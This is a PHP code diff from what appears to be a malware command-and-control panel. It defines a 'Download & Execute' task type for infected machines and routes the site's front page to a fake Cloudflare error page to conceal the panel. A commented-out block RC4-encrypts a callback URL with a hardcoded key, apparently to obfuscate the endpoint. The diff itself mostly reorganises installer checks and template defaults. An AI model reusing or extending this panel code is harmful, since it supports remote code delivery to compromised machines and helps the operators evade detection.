@@ -8,6 +8,37 @@ $installer = true;
 $loadedVersion = "2.0";
 $pluginSetting_Tabs = array();
 
+if ( !isset($_SERVER['HTACCESS']) ) {
+  //  die(".htaccess is not Supported enable mod_rewrite");
+}
+
+
+
+
+include(__DIR__ . '/src/Classes/Crypt/Base.php');
+include(__DIR__ . '/src/Classes/Crypt/Rijndael.php');
+include(__DIR__ . '/src/Classes/Crypt/AES.php');
+include(__DIR__ . '/src/Classes/Crypt/RC4.php');
+include(__DIR__ . '/src/Classes/Crypt/Random.php');
+
+
+/*
+
+$base64 = "AAA";
+
+$cipher = new  phpseclib\Crypt\RC4();
+$cipher->setKey('S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>');
+$encrypted = $cipher->encrypt("http://10.0.0.9/request");
+echo  base64_encode($encrypted);
+//echo base64_decode($encrypted);
+echo "<br>";
+$encrypted = base64_decode("keRwrh9WFcFuWnKVN96dpV8afWtm4UHiHyHi8c35cIQ=");
+echo $cipher->decrypt($encrypted);
+
+
+
+die();
+*/
 $navigation = array();
 if (file_exists(__DIR__ . '/../../config.php')) {
     $installer = false;
@@ -27,7 +58,7 @@ require __DIR__ . '/src/Controllers/Public/Recovery.class.php';
 
 $tpl = new Smarty;
 $router = new \Bramus\Router\Router();
-
+if (!$installer) {
 $task_configuration = array(
     "dande" => array(
         "name" => "Download & Execute",
@@ -54,9 +85,9 @@ $task_configuration = array(
     ),
 );
 
-$statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
-$statementConfig->execute(array("1"));
-$config = $statementConfig->fetch();
+    $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
+    $statementConfig->execute(array("1"));
+    $config = $statementConfig->fetch();
 
 
 $foundPlugins = array();
@@ -74,7 +105,7 @@ foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginN
 }
 
 
-if (!$installer) {
+
     require __DIR__ . '/src/Controllers/Public/Main.class.php';
     $router->all('/login', 'Main@login');
     $router->all('/', 'FakeErrors@cloudflare');
@@ -101,12 +132,19 @@ $router->run(function () use ($tpl) {
     $tpl->caching = false;
     $tpl->compile_check = true;
     $tpl->force_compile = true;
+
+    if(empty($GLOBALS["config"]["template"])){
+        $GLOBALS["config"]["template"] = "v2";
+    }
+
     $tpl->setTemplateDir(__DIR__ . "/templates/".$GLOBALS["config"]["template"]."/");
     $templateDir = $GLOBALS["template"][0] . "/" . $GLOBALS["template"][1] . ".tpl";
     $GLOBALS["tpl"]->assign("includeDir", "/versions/".$GLOBALS["loadedVersion"]."/templates/".$GLOBALS["config"]["template"]."/");
-    $GLOBALS["tpl"]->assign("navRegistrations", $GLOBALS["navigation"]);
-    $GLOBALS["tpl"]->assign("task_configuration", $GLOBALS["task_configuration"]);
-    $GLOBALS["tpl"]->assign("pluginSetting_Tabs", $GLOBALS["pluginSetting_Tabs"]);
+    if (!$GLOBALS["installer"]) {
+        $GLOBALS["tpl"]->assign("navRegistrations", $GLOBALS["navigation"]);
+        $GLOBALS["tpl"]->assign("task_configuration", $GLOBALS["task_configuration"]);
+        $GLOBALS["tpl"]->assign("pluginSetting_Tabs", $GLOBALS["pluginSetting_Tabs"]);
+    }
     $tpl->display($templateDir);
 });
 
